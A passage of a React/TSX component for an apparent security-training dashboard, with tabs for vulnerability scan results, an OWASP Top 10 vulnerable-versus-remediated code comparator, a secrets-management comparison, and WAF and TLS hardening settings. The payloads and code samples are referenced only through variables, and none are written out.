            <div className="p-4 rounded-xl bg-slate-50 border border-amber-200 bg-gradient-to-br from-[#ffa657]/5 to-transparent">
              <div className="text-xs text-slate-500">High Severity</div>
              <div className="text-2xl font-extrabold text-amber-600 mt-1">
                {scanResultsList.filter((r) => r.severity === "HIGH").length}
              </div>
              <div className="text-[11px] text-amber-600/80 mt-1 font-mono">
                Fix within 7 days
              </div>
            </div>

            <div className="p-4 rounded-xl bg-slate-50 border border-violet-200 bg-gradient-to-br from-[#bc8cff]/5 to-transparent">
              <div className="text-xs text-slate-500">Medium Severity</div>
              <div className="text-2xl font-extrabold text-violet-600 mt-1">
                {scanResultsList.filter((r) => r.severity === "MEDIUM").length}
              </div>
              <div className="text-[11px] text-violet-600/80 mt-1 font-mono">
                Scheduled Maintenance
              </div>
            </div>

            <div className="p-4 rounded-xl bg-slate-50 border border-indigo-200 bg-gradient-to-br from-[#58a6ff]/5 to-transparent">
              <div className="text-xs text-slate-500">Low / Info</div>
              <div className="text-2xl font-extrabold text-indigo-600 mt-1">
                {scanResultsList.filter((r) => r.severity === "LOW").length}
              </div>
              <div className="text-[11px] text-indigo-600/80 mt-1 font-mono">
                Best practice hardening
              </div>
            </div>
          </div>

          {/* Results Table & Details Inspector */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Table */}
            <div className="lg:col-span-2 p-5 rounded-xl bg-white border border-slate-200 card-shadow space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <h4 className="text-sm font-bold text-slate-900">
                  Detected Vulnerabilities ({filteredScanResults.length})
                </h4>

                {/* Filter Selector */}
                <div className="flex items-center gap-1 bg-slate-50 p-1 rounded-lg border border-slate-200">
                  {["ALL", "CRITICAL", "HIGH", "MEDIUM", "LOW"].map((sev) => (
                    <button
                      key={sev}
                      onClick={() => setScanFilterSeverity(sev)}
                      className={`px-2.5 py-1 rounded text-[11px] font-semibold transition-all ${
                        scanFilterSeverity === sev
                          ? "bg-indigo-600 text-slate-900"
                          : "text-slate-500 hover:text-slate-900"
                      }`}
                    >
                      {sev}
                    </button>
                  ))}
                </div>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 text-slate-500 font-mono border-b border-slate-200">
                    <tr>
                      <th className="py-2.5 px-3">CVE / ID</th>
                      <th className="py-2.5 px-3">Severity</th>
                      <th className="py-2.5 px-3">Scanner</th>
                      <th className="py-2.5 px-3">Component</th>
                      <th className="py-2.5 px-3">CVSS</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#30363d]/50 font-mono">
                    {filteredScanResults.map((item) => {
                      const isSelected = selectedScanResult?.id === item.id;
                      let sevBg = "bg-indigo-50 text-indigo-600 border-indigo-200";
                      if (item.severity === "CRITICAL")
                        sevBg = "bg-rose-50 text-rose-600 border-rose-200";
                      if (item.severity === "HIGH")
                        sevBg = "bg-amber-50 text-amber-600 border-amber-200";
                      if (item.severity === "MEDIUM")
                        sevBg = "bg-violet-50 text-violet-600 border-violet-200";

                      return (
                        <tr
                          key={item.id}
                          onClick={() => setSelectedScanResult(item)}
                          className={`cursor-pointer transition-colors ${
                            isSelected
                              ? "bg-indigo-50 text-slate-900"
                              : "hover:bg-white"
                          }`}
                        >
                          <td className="py-2.5 px-3 font-semibold text-indigo-600">
                            {item.cve}
                          </td>
                          <td className="py-2.5 px-3">
                            <span
                              className={`px-2 py-0.5 rounded border text-[10px] font-bold ${sevBg}`}
                            >
                              {item.severity}
                            </span>
                          </td>
                          <td className="py-2.5 px-3 text-slate-500">{item.tool}</td>
                          <td className="py-2.5 px-3 text-slate-900">{item.component}</td>
                          <td className="py-2.5 px-3 font-bold text-slate-900">
                            {item.cvssScore.toFixed(1)}
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </div>

            {/* Vulnerability Inspector Drawer */}
            <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow space-y-4">
              <h4 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                <span>🔬</span> Vulnerability Details & Fix
              </h4>

              {selectedScanResult ? (
                <div className="space-y-4 text-xs">
                  <div>
                    <span className="text-[11px] font-mono text-slate-500">
                      {selectedScanResult.cve} ({selectedScanResult.tool})
                    </span>
                    <h5 className="text-sm font-bold text-slate-900 mt-0.5">
                      {selectedScanResult.title}
                    </h5>
                  </div>

                  <div className="grid grid-cols-2 gap-2 text-[11px] font-mono p-3 rounded-lg bg-slate-50 border border-slate-200">
                    <div>
                      <span className="text-slate-500">Affected:</span>
                      <div className="text-rose-600 font-semibold">
                        {selectedScanResult.installedVersion}
                      </div>
                    </div>
                    <div>
                      <span className="text-slate-500">Remediated:</span>
                      <div className="text-emerald-600 font-semibold">
                        {selectedScanResult.fixedVersion}
                      </div>
                    </div>
                  </div>

                  <div>
                    <label className="block text-slate-500 mb-1 font-semibold">
                      Description:
                    </label>
                    <p className="text-slate-900 leading-relaxed">
                      {selectedScanResult.description}
                    </p>
                  </div>

                  <div>
                    <label className="block text-emerald-600 mb-1 font-semibold flex items-center gap-1">
                      <span>🛠️</span> Remediation Fix Snippet:
                    </label>
                    <div className="p-3 rounded-lg bg-slate-50 border border-emerald-200 text-emerald-600 font-mono text-[11px] break-all">
                      {selectedScanResult.remediation}
                    </div>
                  </div>
                </div>
              ) : (
                <p className="text-xs text-slate-500">
                  Select a vulnerability from the table to inspect details and remediation instructions.
                </p>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ========================================================= */}
      {/* TAB 2: OWASP TOP 10 INTERACTIVE MATRIX & REMEDIATION      */}
      {/* ========================================================= */}
      {activeTab === "owasp" && (
        <div className="space-y-6">
          {/* Header */}
          <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow">
            <h3 className="text-lg font-bold text-slate-900">
              2. OWASP Top 10 Vulnerability Matrix & Remediation Lab
            </h3>
            <p className="text-xs text-slate-500 mt-1">
              Select any OWASP Top 10 category to view real-world exploit scenarios, compare vulnerable vs remediated code, and run interactive exploit tests.
            </p>
          </div>

          {/* Matrix Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
            {OWASP_TOP_10.map((item) => {
              const isSelected = item.id === selectedOwaspId;
              return (
                <button
                  key={item.id}
                  onClick={() => {
                    setSelectedOwaspId(item.id);
                    setTestPayload(item.payloadExample);
                    setTestOutput(null);
                  }}
                  className={`p-3 rounded-xl border text-left transition-all ${
                    isSelected
                      ? "bg-indigo-600/15 border-indigo-400 text-slate-900 shadow-md shadow-[#58a6ff]/10"
                      : "bg-slate-50 border-slate-200 text-slate-500 hover:text-slate-900 hover:bg-white"
                  }`}
                >
                  <div className="text-[10px] font-mono text-indigo-600 font-bold">
                    {item.code}
                  </div>
                  <div className="text-xs font-bold truncate mt-0.5">
                    {item.title}
                  </div>
                </button>
              );
            })}
          </div>

          {/* Selected OWASP Deep Dive */}
          <div className="p-6 rounded-xl bg-white border border-slate-200 card-shadow space-y-6">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-200 pb-4">
              <div>
                <span className="px-2.5 py-0.5 rounded-full bg-indigo-50 text-indigo-600 border border-indigo-200 text-xs font-mono font-semibold">
                  {activeOwasp.code}
                </span>
                <h4 className="text-xl font-extrabold text-slate-900 mt-1">
                  {activeOwasp.title}
                </h4>
              </div>
              <div className="text-xs text-amber-600 font-mono bg-amber-50 px-3 py-1.5 rounded-lg border border-amber-400/20 max-w-md">
                <strong>Impact:</strong> {activeOwasp.impact}
              </div>
            </div>

            <p className="text-xs text-slate-900 leading-relaxed">
              {activeOwasp.description}
            </p>

            {/* Code Comparator */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {/* Vulnerable Code */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs">
                  <span className="font-bold text-rose-600 flex items-center gap-1">
                    <span>❌</span> Vulnerable Implementation
                  </span>
                  <span className="text-[10px] text-slate-500 font-mono">
                    UNSECURE
                  </span>
                </div>
                <pre className="p-4 rounded-xl bg-slate-50 border border-rose-200 text-rose-600 text-[11px] font-mono overflow-x-auto whitespace-pre-wrap">
                  {activeOwasp.vulnerableCode}
                </pre>
              </div>

              {/* Remediated Code */}
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs">
                  <span className="font-bold text-emerald-600 flex items-center gap-1">
                    <span>✅</span> Remediated Secure Implementation
                  </span>
                  <span className="text-[10px] text-emerald-600 font-mono">
                    HARDENED
                  </span>
                </div>
                <pre className="p-4 rounded-xl bg-slate-50 border border-emerald-200 text-emerald-600 text-[11px] font-mono overflow-x-auto whitespace-pre-wrap">
                  {activeOwasp.remediatedCode}
                </pre>
              </div>
            </div>

            {/* Key Defenses */}
            <div className="p-4 rounded-xl bg-white border border-slate-200 card-shadow space-y-2">
              <h5 className="text-xs font-bold text-slate-900 flex items-center gap-1.5">
                <span>🛡️</span> Key Architectural Defenses:
              </h5>
              <ul className="grid grid-cols-1 sm:grid-cols-3 gap-2 text-xs text-slate-500">
                {activeOwasp.keyDefenses.map((def, i) => (
                  <li
                    key={i}
                    className="p-2 rounded bg-white border border-slate-200 text-slate-900 flex items-start gap-2"
                  >
                    <span className="text-indigo-600 font-bold">•</span>
                    <span>{def}</span>
                  </li>
                ))}
              </ul>
            </div>

            {/* Exploit Simulator */}
            <div className="p-5 rounded-xl bg-white border border-slate-200 space-y-4">
              <h5 className="text-xs font-bold text-slate-900 flex items-center gap-2">
                <span>🧪</span> Exploit / Defense Interactive Tester
              </h5>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                <div className="sm:col-span-2">
                  <label className="block text-xs text-slate-500 mb-1">
                    Test Request Payload:
                  </label>
                  <input
                    type="text"
                    value={testPayload}
                    onChange={(e) => setTestPayload(e.target.value)}
                    className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
                  />
                </div>

                <div>
                  <label className="block text-xs text-slate-500 mb-1">
                    Target Handler Mode:
                  </label>
                  <select
                    value={testMode}
                    onChange={(e) =>
                      setTestMode(e.target.value as "vulnerable" | "remediated")
                    }
                    className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
                  >
                    <option value="vulnerable">Vulnerable Handler</option>
                    <option value="remediated">Remediated Handler</option>
                  </select>
                </div>
              </div>

              <button
                onClick={handleTestExploit}
                className="px-4 py-2 rounded-lg bg-indigo-600 text-slate-900 font-semibold text-xs hover:bg-indigo-600/90 transition-all"
              >
                Execute Test Request
              </button>

              {testOutput && (
                <div className="p-4 rounded-lg bg-slate-50 border border-slate-200 text-xs font-mono whitespace-pre-wrap text-slate-900">
                  {testOutput}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ========================================================= */}
      {/* TAB 3: SECRET MANAGEMENT WORKFLOW (VAULT VS AWS SECRETS)  */}
      {/* ========================================================= */}
      {activeTab === "secrets" && (
        <div className="space-y-6">
          {/* Header */}
          <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow">
            <h3 className="text-lg font-bold text-slate-900">
              3. Secret Management Workflow (HashiCorp Vault vs AWS Secrets Manager)
            </h3>
            <p className="text-xs text-slate-500 mt-1">
              Compare enterprise secret engine architecture, dynamic credential generation, token TTL leases, and automated rotation.
            </p>
          </div>

          {/* Architecture Comparison Cards */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* HashiCorp Vault */}
            <div className="p-5 rounded-xl bg-slate-50 border border-violet-200 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-200 pb-3">
                <div className="flex items-center gap-2">
                  <span className="text-xl">🔐</span>
                  <h4 className="text-base font-bold text-slate-900">
                    HashiCorp Vault
                  </h4>
                </div>
                <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-violet-50 text-violet-600 border border-violet-200 font-bold">
                  MULTI-CLOUD / ON-PREM
                </span>
              </div>
              <ul className="text-xs text-slate-500 space-y-2">
                <li className="flex items-start gap-2">
                  <span className="text-violet-600">•</span>
                  <span>
                    <strong>Encryption:</strong> Shamir Secret Sharing, Transit Secrets Engine (EaaS).
                  </span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-violet-600">•</span>
                  <span>
                    <strong>Dynamic Secrets:</strong> Generates short-lived DB credentials (e.g. 1h TTL) on-demand.
                  </span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-violet-600">•</span>
                  <span>
                    <strong>Auth Methods:</strong> AppRole, Kubernetes ServiceAccount JWT, TLS Certificates.
                  </span>
                </li>
              </ul>
            </div>

            {/* AWS Secrets Manager */}
            <div className="p-5 rounded-xl bg-slate-50 border border-amber-200 space-y-4">
              <div className="flex items-center justify-between border-b border-slate-200 pb-3">
                <div className="flex items-center gap-2">
                  <span className="text-xl">☁️</span>
                  <h4 className="text-base font-bold text-slate-900">
                    AWS Secrets Manager
                  </h4>
                </div>
                <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-amber-50 text-amber-600 border border-amber-200 font-bold">
                  AWS NATIVE
                </span>
              </div>
              <ul className="text-xs text-slate-500 space-y-2">
                <li className="flex items-start gap-2">
                  <span className="text-amber-600">•</span>
                  <span>
                    <strong>Encryption:</strong> Envelope Encryption integrated with AWS KMS keys.
                  </span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-amber-600">•</span>
                  <span>
                    <strong>Automated Rotation:</strong> Native AWS Lambda rotation templates for RDS, Redshift, DocumentDB.
                  </span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-amber-600">•</span>
                  <span>
                    <strong>Auth Methods:</strong> IAM Policies, STS Temporary Credentials, VPC Endpoints.
                  </span>
                </li>
              </ul>
            </div>
          </div>

          {/* Interactive Lifecycle Steps */}
          <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow space-y-4">
            <h4 className="text-sm font-bold text-slate-900">
              Secret Lifecycle Pipeline
            </h4>

            <div className="grid grid-cols-1 sm:grid-cols-4 gap-2">
              {[
                { step: 1, label: "1. Ingestion & Encryption" },
                { step: 2, label: "2. App Auth & STS" },
                { step: 3, label: "3. Dynamic Fetch & TTL" },
                { step: 4, label: "4. Rotation & Audit" },
              ].map((s) => (
                <button
                  key={s.step}
                  onClick={() => setSecretLifecycleStep(s.step)}
                  className={`p-3 rounded-lg border text-xs font-semibold text-left transition-all ${
                    secretLifecycleStep === s.step
                      ? "bg-indigo-600 text-slate-900 font-bold border-indigo-400"
                      : "bg-slate-50 text-slate-500 border-slate-200 hover:text-slate-900"
                  }`}
                >
                  {s.label}
                </button>
              ))}
            </div>

            <div className="p-4 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 leading-relaxed">
              {secretLifecycleStep === 1 && (
                <p>
                  <strong>Storage & KMS Encryption:</strong> Secrets are encrypted using AES-256-GCM. In Vault, master keys are unsealed via Shamir threshold key shares. In AWS, KMS Envelope Encryption wraps data keys.
                </p>
              )}
              {secretLifecycleStep === 2 && (
                <p>
                  <strong>Authentication & Token Binding:</strong> Applications authenticate via IAM Roles (AWS) or Kubernetes ServiceAccount Tokens (Vault). Tokens carry strict ACL policies and automatically expire.
                </p>
              )}
              {secretLifecycleStep === 3 && (
                <p>
                  <strong>Dynamic Credential Leasing:</strong> Instead of static passwords, Vault dynamically creates temporary DB users (`v-app-user-x89`) valid for 1 hour. Lease renewal is required to maintain access.
                </p>
              )}
              {secretLifecycleStep === 4 && (
                <p>
                  <strong>Automated Rotation & SIEM Audit:</strong> Lambda rotators update DB user passwords on a 30-day schedule without application downtime. Every fetch/rotation is logged to AWS CloudTrail / Vault Audit Logs.
                </p>
              )}
            </div>
          </div>

          {/* Interactive Live Secret Simulator */}
          <div className="p-5 rounded-xl bg-white border border-slate-200 space-y-4">
            <h4 className="text-sm font-bold text-slate-900 flex items-center gap-2">
              <span>💻</span> Secret Fetch & Rotation Simulator
            </h4>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div>
                <label className="block text-xs text-slate-500 mb-1">
                  Select Provider:
                </label>
                <select
                  value={secretProvider}
                  onChange={(e) =>
                    setSecretProvider(e.target.value as "vault" | "aws")
                  }
                  className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
                >
                  <option value="vault">HashiCorp Vault (AppRole / KV v2)</option>
                  <option value="aws">AWS Secrets Manager (KMS)</option>
                </select>
              </div>

              <div className="sm:col-span-2">
                <label className="block text-xs text-slate-500 mb-1">
                  Secret Identifier Path:
                </label>
                <input
                  type="text"
                  value={secretPath}
                  onChange={(e) => setSecretPath(e.target.value)}
                  className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
                />
              </div>
            </div>

            <div className="flex flex-wrap items-center gap-3 pt-1">
              <button
                onClick={handleFetchSecret}
                className="px-4 py-2 rounded-lg bg-indigo-600 text-slate-900 font-semibold text-xs hover:bg-indigo-600/90 transition-all"
              >
                Fetch Secret Payload
              </button>

              <button
                onClick={handleRotateSecret}
                className="px-4 py-2 rounded-lg bg-[#ffa657] text-slate-900 font-semibold text-xs hover:bg-[#ffa657]/90 transition-all"
              >
                Trigger Immediate Rotation
              </button>

              <button
                onClick={() => setIsSecretMasked(!isSecretMasked)}
                className="px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-slate-500 text-xs hover:text-slate-900"
              >
                {isSecretMasked ? "👁️ Unmask Tokens" : "🙈 Mask Tokens"}
              </button>

              <div className="ml-auto text-xs font-mono text-emerald-600">
                Lease TTL: {rotationTimer}s remaining
              </div>
            </div>

            {secretLog && (
              <pre className="p-4 rounded-lg bg-slate-50 border border-slate-200 text-xs text-emerald-600 font-mono overflow-x-auto whitespace-pre-wrap">
                {secretLog}
              </pre>
            )}
          </div>
        </div>
      )}

      {/* ========================================================= */}
      {/* TAB 4: WAF RULES & SSL/TLS HARDENING                       */}
      {/* ========================================================= */}
      {activeTab === "waf" && (
        <div className="space-y-6">
          {/* Header */}
          <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow">
            <h3 className="text-lg font-bold text-slate-900">
              4. Web Application Firewall (WAF) & SSL/TLS Hardening Lab
            </h3>
            <p className="text-xs text-slate-500 mt-1">
              Configure L7 WAF protection rulesets, test attack payloads, and audit SSL/TLS cipher suites & security response headers.
            </p>
          </div>

          {/* WAF Rule Engine & Traffic Simulator */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            {/* Active Rules List */}
            <div className="lg:col-span-2 p-5 rounded-xl bg-white border border-slate-200 card-shadow space-y-4">
              <h4 className="text-sm font-bold text-slate-900">
                WAF Rule Table ({wafRules.length} Active Rules)
              </h4>

              <div className="overflow-x-auto">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 text-slate-500 font-mono border-b border-slate-200">
                    <tr>
                      <th className="py-2 px-3">State</th>
                      <th className="py-2 px-3">Rule Name</th>
                      <th className="py-2 px-3">Type</th>
                      <th className="py-2 px-3">Action</th>
                      <th className="py-2 px-3">Blocked Hits</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-[#30363d]/50 font-mono">
                    {wafRules.map((rule) => (
                      <tr key={rule.id} className="hover:bg-white">
                        <td className="py-2 px-3">
                          <input
                            type="checkbox"
                            checked={rule.enabled}
                            onChange={() => toggleWafRule(rule.id)}
                            className="rounded accent-[#58a6ff]"
                          />
                        </td>
                        <td className="py-2 px-3 text-slate-900 font-semibold">
                          {rule.name}
                        </td>
                        <td className="py-2 px-3 text-slate-500">{rule.type}</td>
                        <td className="py-2 px-3">
                          <span
                            className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                              rule.action === "BLOCK"
                                ? "bg-rose-50 text-rose-600 border border-rose-200"
                                : "bg-emerald-50 text-emerald-600 border border-emerald-200"
                            }`}
                          >
                            {rule.action}
                          </span>
                        </td>
                        <td className="py-2 px-3 text-amber-600 font-bold">
                          {rule.hits}
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* Add Custom WAF Rule Form */}
              <form
                onSubmit={handleAddWafRule}
                className="p-4 rounded-lg bg-slate-50 border border-slate-200 space-y-3"
              >
                <div className="text-xs font-bold text-slate-900">
                  + Add Custom WAF Rule:
                </div>
                <div className="grid grid-cols-1 sm:grid-cols-4 gap-2 text-xs">
                  <input
                    type="text"
                    value={newRuleName}
                    onChange={(e) => setNewRuleName(e.target.value)}
                    placeholder="Rule Name"
                    className="px-2.5 py-1.5 rounded bg-white border border-slate-200 text-slate-900"
                  />
                  <select
                    value={newRuleType}
                    onChange={(e) =>
                      setNewRuleType(
                        e.target.value as
                          | "SQLi"
                          | "XSS"
                          | "RateLimit"
                          | "GeoBlock"
                          | "Custom"
                      )
                    }
                    className="px-2.5 py-1.5 rounded bg-white border border-slate-200 text-slate-900"
                  >
                    <option value="SQLi">SQLi</option>
                    <option value="XSS">XSS</option>
                    <option value="RateLimit">RateLimit</option>
                    <option value="Custom">Custom</option>
                  </select>
                  <input
                    type="text"
                    value={newRuleCond}
                    onChange={(e) => setNewRuleCond(e.target.value)}
                    placeholder="Match Condition"
                    className="px-2.5 py-1.5 rounded bg-white border border-slate-200 text-slate-900"
                  />
                  <select
                    value={newRuleAction}
                    onChange={(e) =>
                      setNewRuleAction(
                        e.target.value as "BLOCK" | "ALLOW" | "COUNT" | "CAPTCHA"
                      )
                    }
                    className="px-2.5 py-1.5 rounded bg-white border border-slate-200 text-slate-900"
                  >
                    <option value="BLOCK">BLOCK</option>
                    <option value="ALLOW">ALLOW</option>
                    <option value="CAPTCHA">CAPTCHA</option>
                  </select>
                </div>
                <button
                  type="submit"
                  className="px-3 py-1 rounded bg-indigo-600 text-slate-900 text-xs font-semibold"
                >
                  Create Rule
                </button>
              </form>
            </div>

            {/* Live Traffic Inspector */}
            <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow space-y-4">
              <h4 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                <span>📡</span> WAF Live Traffic Tester
              </h4>

              <div>
                <label className="block text-xs text-slate-500 mb-1">
                  Select Traffic Profile:
                </label>
                <select
                  value={simTrafficType}
                  onChange={(e) =>
                    setSimTrafficType(
                      e.target.value as "normal" | "sqli" | "xss" | "ddos"
                    )
                  }
                  className="w-full px-3 py-2 rounded-lg bg-slate-50 border border-slate-200 text-xs text-slate-900 font-mono"
                >
                  <option value="normal">Normal HTTP GET Traffic</option>
                  <option value="sqli">SQL Injection Attack Payload</option>
                  <option value="xss">Cross-Site Scripting (XSS) Payload</option>
                  <option value="ddos">DDoS Traffic Burst (Rate Limit)</option>
                </select>
              </div>

              <button
                onClick={handleTestWafTraffic}
                className="w-full py-2.5 rounded-lg bg-indigo-600 text-slate-900 font-bold text-xs hover:bg-indigo-600/90 transition-all"
              >
                Send Test Request to WAF Engine
              </button>

              {wafResult && (
                <div className="p-4 rounded-lg bg-slate-50 border border-slate-200 text-xs font-mono whitespace-pre-wrap text-slate-900">
                  {wafResult}
                </div>
              )}
            </div>
          </div>

          {/* SSL/TLS Hardening & Security Headers Configurator */}
          <div className="p-5 rounded-xl bg-white border border-slate-200 card-shadow space-y-6">
            <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-b border-slate-200 pb-4">
              <div>
                <h4 className="text-base font-bold text-slate-900">
                  SSL/TLS Protocol Hardening & Response Header Audit
                </h4>
                <p className="text-xs text-slate-500">
                  Configure SSL Labs target grading settings and test header compliance.
                </p>
              </div>

              <div className="flex items-center gap-3">
                <span className="text-xs text-slate-500">SSL Rating:</span>
                <span
                  className={`text-2xl font-black font-mono ${sslGrade.color}`}
                >
                  Grade {sslGrade.grade}
                </span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 text-xs">
              {/* TLS Version & Ciphers */}
              <div className="space-y-3 p-4 rounded-lg bg-slate-50 border border-slate-200">
                <h5 className="font-bold text-slate-900">
                  TLS Protocols & Ciphers:
                </h5>

                <label className="flex items-center gap-2 cursor-pointer text-slate-900">
                  <input
                    type="checkbox"
                    checked={tls13}
                    onChange={(e) => setTls13(e.target.checked)}
                    className="accent-[#58a6ff]"
                  />
                  <span>Enable TLS 1.3 (Modern, Perfect Forward Secrecy)</span>
                </label>

                <label className="flex items-center gap-2 cursor-pointer text-slate-900">
                  <input
                    type="checkbox"
                    checked={tls12}
                    onChange={(e) => setTls12(e.target.checked)}
                    className="accent-[#58a6ff]"
                  />
                  <span>Enable TLS 1.2</span>
                </label>

                <label className="flex items-center gap-2 cursor-pointer text-rose-600">
                  <input
                    type="checkbox"
                    checked={enableWeakCiphers}
                    onChange={(e) => setEnableWeakCiphers(e.target.checked)}
                    className="accent-[#ff7b72]"
                  />
                  <span>Enable Weak Ciphers (RC4, 3DES, CBC) - ⚠️ INSECURE</span>
                </label>
              </div>

              {/* Security Headers */}
              <div className="space-y-3 p-4 rounded-lg bg-slate-50 border border-slate-200">
                <h5 className="font-bold text-slate-900">
                  HTTP Security Headers:
                </h5>

                <label className="flex items-center gap-2 cursor-pointer text-slate-900">
                  <input
                    type="checkbox"
                    checked={enableHsts}
                    onChange={(e) => setEnableHsts(e.target.checked)}
                    className="accent-[#58a6ff]"
                  />
                  <span>Strict-Transport-Security (HSTS max-age=31536000)</span>
                </label>

                <label className="flex items-center gap-2 cursor-pointer text-slate-900">
                  <input
                    type="checkbox"
                    checked={enableCsp}
                    onChange={(e) => setEnableCsp(e.target.checked)}
                    className="accent-[#58a6ff]"
                  />
                  <span>Content-Security-Policy (CSP default-src &apos;self&apos;)</span>
                </label>

                <label className="flex items-center gap-2 cursor-pointer text-slate-900">
                  <input
                    type="checkbox"
                    checked={enableXFrame}
                    onChange={(e) => setEnableXFrame(e.target.checked)}
                    className="accent-[#58a6ff]"
                  />
                  <span>X-Frame-Options (DENY Clickjacking)</span>
                </label>
              </div>
            </div>

            <div className="p-3 rounded-lg bg-white border border-slate-200 text-xs font-mono text-slate-500">
              <strong>Audit Evaluation Result:</strong>{" "}
              <span className={sslGrade.color}>{sslGrade.reason}</span>
            </div>
          </div>
        </div>
      )}
    </section>
  );
}
